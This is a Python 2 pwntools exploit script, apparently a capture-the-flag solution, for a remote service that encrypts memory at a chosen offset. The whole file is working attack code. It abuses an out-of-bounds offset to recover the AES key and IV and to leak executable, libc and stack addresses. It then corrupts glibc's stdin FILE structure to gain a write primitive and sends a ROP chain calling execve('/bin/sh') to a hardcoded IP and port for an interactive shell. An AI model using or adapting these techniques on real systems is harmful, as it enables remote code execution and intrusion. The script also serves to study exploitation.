#!/usr/bin/python2

import Crypto.Cipher.AES
from pwn import *


def exploit(connection):
    libc = ELF("libc.so.6")

    def run_encrypt(offset, size):
        connection.recvuntil("offset:")
        connection.send("{:d}\n".format(offset))
        connection.recvuntil("size:")
        connection.send("{:d}\n".format(size))
        response = connection.recvn((size & ~ 0x0f) + 0x10)
        return response

    # Step 1: Obtain fresh key and IV
    #
    # Whenever we request encryption, the server encrypts in place and sends
    # copy of encrypted data. By running encryption over current (unknown) key
    # and IV, we force "fresh" key and IV to be generated and sent to us.

    ciphertext = run_encrypt(-0x20, 0x1f)
    key = ciphertext[: 0x10]
    iv = ciphertext[0x10: 0x20]

    # Step 2: Leak address of executable
    #
    # Run encryption over `__dso_handle` and decrypt received ciphertext.

    ciphertext = run_encrypt(-0x3a0, 0x0f)
    cipher = Crypto.Cipher.AES.new(key, mode=Crypto.Cipher.AES.MODE_CBC, IV=iv)
    plaintext = cipher.decrypt(ciphertext)
    dso_handle_address = u64(plaintext[8: 0x10])
    info("dso_handle_address = %012x", dso_handle_address)

    main_address = dso_handle_address - 0x202008
    info("main_address = %012x", main_address)

    # Step 3: Define arbitrary memory read primitive
    #
    # Note that this "destroys" any memory read.

    base_address = main_address + 0x2023a0
    info("base_address = %012x", base_address)

    def read_memory(target_address, size):
        ciphertext = run_encrypt(target_address - base_address, size)
        cipher = Crypto.Cipher.AES.new(key, mode=Crypto.Cipher.AES.MODE_CBC, IV=iv)
        plaintext = cipher.decrypt(ciphertext)
        return plaintext

    # Step 4: Leak address of libc

    stderr_address = u64(read_memory(main_address + 0x202360, 0x0f)[: 8])
    info("stderr_address = %012x", stderr_address)

    libc.address = stderr_address - libc.symbols["_IO_2_1_stderr_"]
    info("libc.address = %012x", libc.address)

    # Step 5: Leak address of stack

    stack_address = u64(read_memory(libc.symbols["environ"], 0x0f)[: 8])
    info("stack_address = %012x", stack_address)

    # Step 6: Create write primitive by corrupting `_IO_2_1_stdin_`
    #
    # Our goal is to modify `_IO_buf_base` and `_IO_buf_end` during single
    # operation. The difficulty is that we very limited control over
    # encryption parameters, so we cannot use encryption operation to write
    # arbitrary values.
    #
    # Our approach is to corrupt least significant byte of `_IO_buf_base`, so
    # it points before `_IO_read_ptr`. During next `scanf` call decimal number
    # is consumed as follows:
    # 1. `scanf` requests first character from stdin
    # 2. stdin is using corrupted `_IO_buf_base` as new start of its buffer,
    #   performing single read syscall over all critical __IO_FILE fields
    # 3. we send single decimal digit followed by sequence of bytes crafted to:
    #   * overwrite `_IO_read_end`, so stdin updated state will indicate that
    #     only one character (the decimal digit) is available in the buffer
    #   * overwrite `_IO_buf_base` and `_IO_buf_end` with arbitrary location
    #     for write primitive
    # 4. `scanf` requests next character from stdin
    # 5. stdin is using corrupted `_IO_buf_base` and `_IO_buf_end` as new input
    #   buffer, performing single read syscall to fill that buffer
    # 6. we send arbitrary content for write primitive
    #
    # When corrupting least significant byte of `_IO_buf_base` we simply check
    # encryption of expected __IO_FILE content, forcing new key and IV until
    # we predict required value.

    while True:
        buffer = StringIO()
        buffer.write(p64(libc.symbols["_IO_2_1_stdin_"] + 0x83))
        buffer.write(p64(libc.symbols["_IO_2_1_stdin_"] + 0x83))
        buffer.write(p64(libc.symbols["_IO_2_1_stdin_"] + 0x83))
        cipher = Crypto.Cipher.AES.new(key, mode=Crypto.Cipher.AES.MODE_CBC, IV=iv)
        ciphertext = cipher.encrypt(buffer.getvalue()[1: 0x11])
        if 4 <= u8(ciphertext[0x0f]) < 8:
            break

        # try another combination of key and IV

        ciphertext = run_encrypt(-0x20, 0x1f)
        key = ciphertext[: 0x10]
        iv = ciphertext[0x10: 0x20]

    # corrupt least significant byte of `_IO_buf_base`

    ciphertext = run_encrypt(libc.symbols["_IO_2_1_stdin_"] + 0x29 - base_address, 0x0f)
    offset = u8(ciphertext[0x0f])

    connection.recvuntil("offset:")

    # corrupt `_IO_read_end`, `_IO_buf_base` and `_IO_buf_end`

    buffer = StringIO()
    buffer.write(p64(0xfbad20ab))
    buffer.write(p64(libc.symbols["_IO_2_1_stdin_"] + 0x83))
    buffer.write(p64(libc.symbols["_IO_2_1_stdin_"] + 0x83 - (0x48 - offset)))
    buffer.write(p64(libc.symbols["_IO_2_1_stdin_"] + 0x83))
    buffer.write(p64(libc.symbols["_IO_2_1_stdin_"] + 0x83))
    buffer.write(p64(libc.symbols["_IO_2_1_stdin_"] + 0x83))
    buffer.write(p64(libc.symbols["_IO_2_1_stdin_"] + 0x83))
    buffer.write(p64(stack_address - 0x130))
    buffer.write(p64(stack_address))
    bytes = buffer.getvalue()

    buffer = StringIO()
    buffer.write("0")
    buffer.write(bytes[offset + 1: ])
    connection.send(buffer.getvalue())

    # ROP

    time.sleep(0.5)

    buffer = StringIO()
    buffer.write(p64(libc.address + 0x1306d9))  # pop rdx ; pop rsi ; ret
    buffer.write(p64(0))
    buffer.write(p64(stack_address - 0x100))
    buffer.write(p64(libc.address + 0x02155f))  # pop rdi ; ret
    buffer.write(p64(stack_address - 0xf0))
    buffer.write(p64(libc.symbols["execve"]))
    buffer.write(p64(stack_address - 0xf0))
    buffer.write(p64(0))
    buffer.write("/bin/sh\x00")
    connection.send(buffer.getvalue())

    time.sleep(0.5)

    connection.interactive()


context.log_level = "debug"
with remote("3.113.219.89", 31337) as connection:
    exploit(connection)
